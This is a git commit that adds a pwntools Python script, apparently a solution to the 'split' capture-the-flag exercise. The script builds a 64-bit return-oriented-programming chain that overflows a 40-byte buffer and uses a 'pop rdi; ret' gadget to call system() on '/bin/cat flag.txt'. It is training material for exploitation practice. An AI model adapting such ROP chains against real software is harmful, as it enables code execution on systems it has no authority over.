9a8b6cd462addb47b96ee4bf9ebc0cf0c4b2d5ef
skavenger2 <75589221+skavenger2@users.noreply.github.com>
2023-03-13 11:53:47 +1100

    Create 64bit_system()_ROPChain.py

---
+++ PWN/PWNTools Examples/64bit_system()_ROPChain.py
@@ -0,0 +1,33 @@
+#!/usr/bin/env python3
+from pwn import *
+
+"""
+cat flag: 0x601060 '/bin/cat flag.txt'
+call system: 0x000000000040074b <+9>:     call   0x400560 <system@plt>
+pop rdi, ret: 0x00000000004007c3: pop rdi; ret;
+
+1. Fill the buffer with 40 bytes of junk
+3. Fill RDI with "cat flag" address
+3. Address of cat flag
+2. Address of call system
+"""
+
+context.log_level = "debug"
+io = process("./split")
+
+offset = 40
+
+io.recvuntil(b"> ")
+
+payload = b""
+payload += b"A" * offset
+payload += p64(0x00000000004007c3)      # pop rdi; ret;
+payload += p64(0x601060)      # /bin/cat flag.txt
+payload += p64(0x000000000040074b)      # call system()
+
+print(str(payload))
+
+io.sendline(payload)
+io.recvuntil(b"Thank you!\n")
+flag = io.recv()
+success(str(flag))
